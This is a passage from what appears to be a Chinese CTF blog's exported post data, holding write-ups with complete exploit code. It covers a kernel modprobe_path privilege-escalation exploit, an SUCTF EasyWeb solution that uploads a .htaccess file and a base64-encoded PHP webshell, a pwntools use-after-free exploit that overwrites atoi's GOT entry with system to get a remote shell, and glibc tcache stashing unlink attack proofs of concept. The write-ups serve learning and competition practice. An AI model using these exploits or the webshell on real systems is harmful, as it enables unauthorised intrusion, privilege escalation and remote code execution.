int size;    long int offset;&#125;;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;int main()&#123;    struct Arg arg;    int fp = open(&quot;/dev/hackme&quot;, 0);    if (fp &lt; 0)    &#123;        printf(&quot;[-] open /dev/hackme failed\\n&quot;);        exit(-1);    &#125;    char *buf;    long int heap_addr;    long int kernel_addr;    long int mod_tree_addr;    long int mode_addr;    long int pool_addr;    long int modprobe_path_addr;    buf = malloc(0x1000);    memset(buf, 0, 0x1000);    memset(buf, &#x27;a&#x27;, 0x100);    arg.idx = 0;    arg.content = buf;    arg.size = 0x100;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 1;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 2;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 3;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 4;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 1;    ioctl(fp, 0x30001, &amp;arg);    arg.idx = 3;    ioctl(fp, 0x30001, &amp;arg);    memset(buf, 0, 0x1000);    arg.idx = 4;    arg.content = buf;    arg.offset = -0x100;    arg.size = 0x100;    ioctl(fp, 0x30003, &amp;arg);    print_hex(buf, sizeof(buf));    heap_addr = *((unsigned long int *)buf);    memset(buf, 0, 0x1000);    arg.idx = 0;    arg.content = buf;    arg.offset = -0x200 + 0x28;    arg.size = 0x200 - 0x28;    ioctl(fp, 0x30003, &amp;arg);    print_hex(buf, sizeof(buf));    kernel_addr = *((unsigned long int *)buf);    mod_tree_addr = kernel_addr - 0x38ae0;    memset(buf, 0, 0x1000);    *((unsigned long int *)buf) = mod_tree_addr + 0x20;    arg.idx = 4;    arg.content = buf;    arg.offset = -0x100;    arg.size = 0x100;    ioctl(fp, 0x30002, &amp;arg);    memset(buf, &#x27;a&#x27;, 0x100);    arg.idx = 5;    arg.content = buf;    arg.size = 0x100;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 6;    ioctl(fp, 0x30000, &amp;arg);    memset(buf, 0, 0x1000);    arg.idx = 6;    arg.content = buf;    arg.size = 0x8;    arg.offset = -0x8;    ioctl(fp, 0x30003, &amp;arg);    print_hex(buf, sizeof(buf));    mode_addr = *((unsigned long int *)buf);    pool_addr = mode_addr + 0x2400;    arg.idx = 5;    ioctl(fp, 0x30001, &amp;arg);    *((unsigned long int *)buf) = pool_addr + 0x90;    arg.idx = 4;    arg.content = buf;    arg.offset = -0x100;    arg.size = 0x100;    ioctl(fp, 0x30002, &amp;arg);    modprobe_path_addr = mod_tree_addr + 0x2e960;    memset(buf, &#x27;a&#x27;, 0x100);    arg.idx = 7;    arg.content = buf;    arg.size = 0x100;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 8;    memset(buf, 0, 0x1000);    *((unsigned long int *)buf) = modprobe_path_addr;    *((unsigned long int *)buf + 1) = 0x100;    ioctl(fp, 0x30000, &amp;arg);    strncpy(buf, &quot;/home/pwn/copy.sh\\x00&quot;, 18);    arg.idx = 9;    arg.content = buf;    arg.size = 0x18;    arg.offset = 0;    ioctl(fp, 0x30002, &amp;arg);    system(&quot;echo -ne &#x27;#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;);    system(&quot;chmod +x /home/pwn/copy.sh&quot;);    system(&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /home/pwn/dummy&quot;);    system(&quot;chmod +x /home/pwn/dummy&quot;);    system(&quot;/home/pwn/dummy&quot;);    return 0;&#125;\n\n\n当然其实在劫持到pool这一步也是可以直接使用 WCTF 2018 klist 这道题的利用方式，利用堆溢出泄漏出cred然后修改cred结构体即可，因为这道题目的漏洞相对来说比较严重，所以ptmx劫持栈什么的都是可以的。这篇文章主要是记录没有遇到过的利用方法。\n\n参考链接：http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\n","categories":["kernel-pwn"],"tags":["modprobe_path"]},{"title":"在刚开始学习pwn的小问题","url":"/2021/09/17/study-pwn1/","content":"\n关于stack overflow的学习\n一般来说会出现get函数，这个函数不受保护可以无限写入，导致可以修改栈内部的内容，填充垃圾数据然后在需要的地方修改到我们需要的地址达到返回shell的效果。\n还可能会出现scanf函数并且函数后面的限制长度会比较长可以实现栈溢出的效果。\n\nROP\n\n\n上图就是执行system的流程，但是我们需要获得反弹shell的话就必须执行system(‘/bin/sh’)需要参数，所以我们需要给system参数。\n当我们跳转到函数地址的时候为了保存数据，会对栈进行操作，x86程序的操作的流程是:\n\n所以可以把system的参数放到栈里面，这样的话就可以填充一个位置的垃圾数据，然后紧跟着往栈里面放需要的参数也就是’/bin/sh’的地址。\n在ubuntu18以上，通过栈溢出ret到system需要注意栈平衡\n","categories":["pwn"],"tags":["rop stack overflow"]},{"title":"SUCTF_2019_EasyWeb","url":"/2021/09/18/suctf-2019-EasyWeb/","content":"`\n题目源码:\n&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);        $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;\n\n绕过 preg_match 执行 eval编写脚本构造出$_GET[xxx]\n&lt;?php$l = &quot;&quot;;$r = &quot;&quot;;$argv = str_split(&quot;_GET&quot;);for ($i = 0; $i &lt; count($argv); $i++) &#123;    for ($j = 0; $j &lt; 255; $j++) &#123;        $k = chr($j) ^ chr(255);      //dechex(255) = ff        if ($k == $argv[$i]) &#123;            if ($j &lt; 16) &#123;                $l .= &quot;%ff&quot;;                $r .= &quot;%0&quot; . dechex($j);                continue;            &#125;            $l .= &quot;%ff&quot;;            $r .= &quot;%&quot; . dechex($j);            continue;        &#125;    &#125;&#125;echo &#x27;$&#123;&#x27; . $l . &#x27;^&#x27; . $r . &#x27;&#125;&#x27;;// 最终的结果为：$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;// 加上参数$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;\n\n第一步的 payload 就是:\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo\n\n然后再 php 可以找到自己的 remote(后面的文件上传也会打印出来所以无所谓的)。\n上传 webshell因为这里过滤了后缀名有 ph 就会结束程序，内容存在&lt;?也会存在程序，还检测了文件的头信息是否为图片格式。所以第一反应就是.htaccess 上传。\n在.htaccess 的文件内容:\nAddType application/x-httpd-php .gif;上面的内容表示把.gif为后缀名的文件当作执行程序加载php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=back.gif&quot;;这句则是在访问一个php文件的时候，会在文件解析之前自动包含上面文件\n\n所以很简单的就可以构造出攻击脚本:\nimport requestsimport base64url = &#x27;http://58d97b5a-ba1f-46e5-82e1-ab2eff363141.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&#x27;htaccess = b&#x27;&#x27;&#x27;\\x00\\x00\\x85\\x48\\x85\\x18    AddType application/x-httpd-php .gif    php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=back.gif&quot;&#x27;&#x27;&#x27;# 因为检测了&lt;?所以webshell经过base64编码来绕过，所以上面包含的时候采用php伪协议decode一下file = &#123;    &#x27;file&#x27;: (&#x27;.htaccess&#x27;, htaccess, &#x27;image/gif&#x27;)&#125;res = requests.post(url=url, files=file).textprint(res)back = b&#x27;GIF89a&#x27; + b&quot;aa&quot; + \\    base64.b64encode(b&quot;&lt;?php eval($_POST[&#x27;wow&#x27;]);?&gt;&quot;)# 这里是一个很坑的点，需要额外增加两个字节，凑足8字节满足base64算法file = &#123;    &#x27;file&#x27;: (&#x27;back.gif&#x27;, back, &#x27;image/gif&#x27;)&#125;res = requests.post(url=url, files=file).textprint(res)\n\n绕过 open_basedir上传了 webshell 之后，直接 var_dump(scandir(‘/‘));应为 open_basedir 的效果无法获取\n\n需要绕过 open_basedir，我就给出 payload 就行，具体原理就去下面的链接去了解。\n\n挂出绕过 open_basedir 从底层出发找出原理的大佬文章的链接\nhttps://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2\n","categories":["web-buuctf"],"tags":["无数字字母shell .htaccess上传 绕过open_basedir"]},{"title":"supermarket","url":"/2021/11/03/supermarket/","content":"检测保护题目给了libc文件\n\n堆栈不可执行\n分析流程void sub_8048FC1()&#123;  while ( 1 )  &#123;    sub_8048864();    printf(&quot;your choice&gt;&gt; &quot;);    switch ( sub_804882E() )    &#123;      case 1:        add();        break;      case 2:        del();        break;      case 3:        list();        break;      case 4:        change_price();        break;      case 5:        change_description();        break;      case 6:        exit(0);        return;      default:        puts(&quot;invalid choice&quot;);        break;    &#125;  &#125;&#125;\n\n一个菜单题(感觉最近的做的菜单题都是堆题)\nint add()&#123;  char *v1; // ebx  char *v2; // ebx  char src[16]; // [esp+4h] [ebp-24h] BYREF  int v4; // [esp+14h] [ebp-14h]  int v5; // [esp+18h] [ebp-10h]  int i; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt;= 15 &amp;&amp; (&amp;s2)[i]; ++i )    ;  if ( i &gt; 15 )    return puts(&quot;no more space&quot;);  printf(&quot;name:&quot;);  sub_8048812(src, 16);  v5 = sub_8048D45(src);  if ( v5 != -1 )    return puts(&quot;name exist&quot;);  v5 = sub_8048D95();  if ( v5 == -1 )    return puts(&quot;no more space&quot;);  (&amp;s2)[v5] = malloc(0x1Cu);  strcpy((&amp;s2)[v5], src);  printf(&quot;name:%s\\n&quot;, src);  v4 = 0;  printf(&quot;price:&quot;);  v4 = sub_804882E();  printf(&quot;price:%d\\n&quot;, v4);  if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 999 )    *((&amp;s2)[v5] + 4) = v4;  *((&amp;s2)[v5] + 5) = 0;  while ( *((&amp;s2)[v5] + 5) &lt;= 0 || *((&amp;s2)[v5] + 5) &gt; 256 )  &#123;    printf(&quot;descrip_size:&quot;);    v1 = (&amp;s2)[v5];    *(v1 + 5) = sub_804882E();  &#125;  printf(&quot;descrip_size:%d\\n&quot;, *((&amp;s2)[v5] + 5));  v2 = (&amp;s2)[v5];  *(v2 + 6) = malloc(*(v2 + 5));  printf(&quot;description:&quot;);  return sub_8048812(*((&amp;s2)[v5] + 6), *((&amp;s2)[v5] + 5));&#125;\n\nint list()&#123;  const char *v0; // esi  int v1; // ebx  const char *v2; // edi  size_t v3; // eax  int v4; // ebx  const char *v5; // esi  size_t v6; // eax  const void *v7; // ebx  size_t v8; // eax  size_t v9; // eax  char s[785]; // [esp+Bh] [ebp-32Dh] BYREF  int i; // [esp+31Ch] [ebp-1Ch]  memset(s, 0, sizeof(s));  for ( i = 0; i &lt;= 15; ++i )  &#123;    if ( (&amp;s2)[i] )    &#123;      if ( strlen(*((&amp;s2)[i] + 6)) &gt; 0x10 )      &#123;        v4 = *((&amp;s2)[i] + 4);        v5 = (&amp;s2)[i];        v6 = strlen(s);        sprintf(&amp;s[v6], &quot;%s: price.%d, des.&quot;, v5, v4);        v7 = *((&amp;s2)[i] + 6);        v8 = strlen(s);        memcpy(&amp;s[v8], v7, 0xDu);        v9 = strlen(s);        memcpy(&amp;s[v9], &quot;...\\n&quot;, 4u);      &#125;      else      &#123;        v0 = *((&amp;s2)[i] + 6);        v1 = *((&amp;s2)[i] + 4);        v2 = (&amp;s2)[i];        v3 = strlen(s);        sprintf(&amp;s[v3], &quot;%s: price.%d, des.%s\\n&quot;, v2, v1, v0);      &#125;    &#125;  &#125;  puts(&quot;all  commodities info list below:&quot;);  return puts(s);&#125;\n\nint change_description()&#123;  int v1; // [esp+8h] [ebp-10h]  int size; // [esp+Ch] [ebp-Ch]  v1 = sub_8048DC8();  if ( v1 == -1 )    return puts(&quot;not exist&quot;);  for ( size = 0; size &lt;= 0 || size &gt; 256; size = sub_804882E() )    printf(&quot;descrip_size:&quot;);  if ( *((&amp;s2)[v1] + 5) != size )    realloc(*((&amp;s2)[v1] + 6), size);  printf(&quot;description:&quot;);  return sub_8048812(*((&amp;s2)[v1] + 6), *((&amp;s2)[v1] + 5));&#125;\n\n看一年找不到问题，去看wp发现有UAF漏洞。主要问题发生在realloc这里，这里的realloc并没有把返回的指针赋值给(&amp;s2)[v1]+6这个位置，所以(&amp;s2)[v1]+6这里还是指向原先的堆块。\n还有额外的就是每一个商品的结构体为:\nstruct Product&#123;    char name[16];    int price;    int descrip_size;    int *description;&#125;;\n\n在add一个新的商品的时候会创建两个chunk，一个是product结构体，另一个则是生成一个chunk大小为descrip_size并且将chunk的指针赋值给description。\nrealloc(void *__ptr, size_t __size)：更改已经配置的内存空间，即更改由malloc()函数分配的内存空间的大小。\n如果将分配的内存减少，realloc仅仅是改变索引的信息。\n如果是将分配的内存扩大，则有以下情况：1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。\n利用分析主要的问题就是在change_description函数里面的realloc重新分配size的时候没有给原先的指针赋值。\n利用思路就是，先进入add函数会生成一个node1然后会继续生成一个node1_description一共生成两个chunk，再进入change_description函数修改descrip_size变大，到了realloc函数就会先free掉以前的node1_description然后新生成一个chunk，但是node1的description指针还是指向的以前的，这时再一次进入add函数会生成一个node2和node2_description，然而这个node1是生成在node1_description上面，所以这个时候就可以控制node1_description将node2的description指针指向到atoi的got表修改到system的位置\n根据上面的思路就是:修改got表-&gt;泄漏atoi的真实地址-&gt;计算偏移量并修改atoi的表为system地址-&gt;输入’/bin/sh’获得shell\nexpfrom pwn import *elf = ELF(&#x27;./questions/supermarket&#x27;)libc = ELF(&#x27;/home/tcdy/download/05e872a7193b4a85877be9d95ac6fc94/libc.so.6&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 54781)context.log_level = &#x27;debug&#x27;atoi_got_addr = elf.got[&#x27;atoi&#x27;]def create(name, descrip_size, description):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;price:&#x27;)    r.sendline(b&#x27;100&#x27;)    r.recvuntil(b&#x27;descrip_size:&#x27;)    r.sendline(bytes(str(descrip_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;description:&#x27;)    r.sendline(description)def delete(name):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)def show():    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;3&#x27;)def update(name, descrip_size, description):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;5&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;descrip_size:&#x27;)    r.sendline(bytes(str(descrip_size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;description:&#x27;)    r.sendline(description)create(b&#x27;0&#x27;, 0x80, b&#x27;a&#x27;*0x10)# 这里我们0x80个字节的意思则是因为我们在输入的时候，最后的一个字符会被改为0所以一般要大于0x1c就行create(b&#x27;1&#x27;, 0x20, b&#x27;a&#x27;*0x10)# 这里创建两个chunk是因为realloc的第一种情况，要是当前内存段存在内存空间的话就直接扩展就行，这样我们就无法UAF所以需要再创一个来chunk来占位置update(b&#x27;0&#x27;, 0x90, b&#x27;&#x27;)create(b&#x27;2&#x27;, 0x20, b&#x27;a&#x27;*0x10)payload = b&#x27;2&#x27;.ljust(16, b&#x27;\\0&#x27;)+p32(100)+p32(0x20)+p32(atoi_got_addr)update(b&#x27;0&#x27;, 0x80, payload)show()r.recvuntil(b&#x27;\\n2: price.100, des.&#x27;, drop=True)real_atoi_addr = u32(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(4, b&#x27;\\0&#x27;))print(real_atoi_addr)offset = real_atoi_addr-libc.symbols[&#x27;atoi&#x27;]system_addr = libc.symbols[&#x27;system&#x27;]+offsetupdate(b&#x27;2&#x27;, 0x20, p32(system_addr))r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)r.sendline(b&#x27;/bin/sh&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["UAF"]},{"title":"tcache stashing unlink attack","url":"/2022/02/24/tcache-stashing-unlink-attack/","content":"tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。\n首先，这种利用方式需要的条件就是存在calloc来申请chunk。\n在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack先看一下源码：\n  if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        &#123;          bck = victim-&gt;bk;\t  if (__glibc_unlikely (bck-&gt;fd != victim))\t    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;          if (av != &amp;main_arena)\t    set_non_main_arena (victim);          check_malloced_chunk (av, victim, nb);#if USE_TCACHE\t  /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */\t  size_t tc_idx = csize2tidx (nb);\t  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\t    &#123;\t      mchunkptr tc_victim;\t      /* While bin not empty and tcache not full, copy chunks over.  */\t      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)\t\t&#123;\t\t  if (tc_victim != 0)\t\t    &#123;\t\t      bck = tc_victim-&gt;bk;\t\t      set_inuse_bit_at_offset (tc_victim, nb);\t\t      if (av != &amp;main_arena)\t\t\t\tset_non_main_arena (tc_victim);\t\t      bin-&gt;bk = bck;\t\t      bck-&gt;fd = bin;\t\t      tcache_put (tc_victim, tc_idx);\t            &#125;\t\t&#125;\t    &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;\n\n在源码的注释也写上了，当tcache没有满，其他bin没有空的情况下就会把其他bin当中的chunk put进tcache内，并且这一阶段是没有任何保护的。根据昨天的largebin attack可以很清楚的看出来，这两行代码是有问题的。\nbin-&gt;bk = bck;bck-&gt;fd = bin;\n\n接下来就用heap exploit2.31当中的poc来做演示(这个poc的方式很巧妙)。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim = 0;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\\n&quot;);\tprintf(&quot;\\n1. need to know heap address and the victim address that you need to attack\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\\n&quot;, &amp;victim, victim);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);\tprintf(&quot;\\n2. choose a stable size and free six identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;6; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);\tprintf(&quot;\\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\t\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Finally, the victim&#x27;s value is changed to a big number\\n&quot;);\tprintf(&quot;Now, victim&#x27;s value: 0x%lx\\n&quot;, victim);\treturn 0;&#125;\t\n\n首先在这里放入六个chunk到tcache内\nfor(int i=0; i&lt;6; i++)&#123;    t1 = calloc(1, 0x50);    free(t1);&#125;\n\n\n下面几步是将一个size为0x60的chunk放入smallbins当中\ns1 = malloc(0x420);pad = malloc(0x20);free(s1);malloc(0x3c0);malloc(0x100);\n\n\n下面进行相同操作把chunk放入smallbin\ns2 = malloc(0x420);pad = malloc(0x80);free(s2);malloc(0x3c0);malloc(0x100);\n\n\n接着修改后一个chunk的bk指针为target-0x10\n*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\n\n\n随后用calloc申请一个smallbin当中的chunk让另一个进入tcache\ncalloc(1, 0x50);\n\n\n可以看到目标地址的值被改变了并且我们最后一个chunk也进入的tcache\n进一步分析以上就是这个漏洞的利用方式之一，和昨天的largebin attack类似，但是这个漏洞存在一个更具有破坏性的利用方式，注意上面的两行代码当中有一行是\nbin-&gt;bk = bck;\n\n这样就导致了我们的smallbin的bk发生了改变\n\n再看在glibc当中的定义\n#define last(b)      ((b)-&gt;bk)\n\n所以这也就导致了更具有破坏性的漏洞，我们可以任意地址申请堆块，并且可以看到tcache_put也是没有任何保护\nstatic __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\ntcache stashing unlink attack+根据上面的进一步分析我们继续来heap exploit里面的poc\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim[4] = &#123;0, 0, 0, 0&#125;;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to get a tcache chunk to arbitrary address\\n&quot;);\tprintf(&quot;\\n1. need to know heap address and the victim address that you need to attack\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\t&amp;victim, victim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);    \tprintf(&quot;\\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\\n&quot;);\tvictim[1] = (uint64_t)(&amp;victim);\tprintf(&quot;\\n3. choose a stable size and free five identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;5; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;\\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\t&amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\\n&quot;);\t\tuint64_t *r = (uint64_t*)malloc(0x50);\tr[0] = 0xaa;\tr[1] = 0xbb;\tr[2] = 0xcc;\tr[3] = 0xdd;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\t\treturn 0;&#125;\t\n\n首先，这里直放入了五个chunk到tcache\nfor(int i=0; i&lt;5; i++)&#123;    t1 = calloc(1, 0x50);    free(t1);&#125;\n\n然后后面是类似的放入两个chunk到smallbin，然后改变bk指针到我们的fake chunk，最后calloc我们的s1即可实现\n需要注意的是，这里victim[1] = 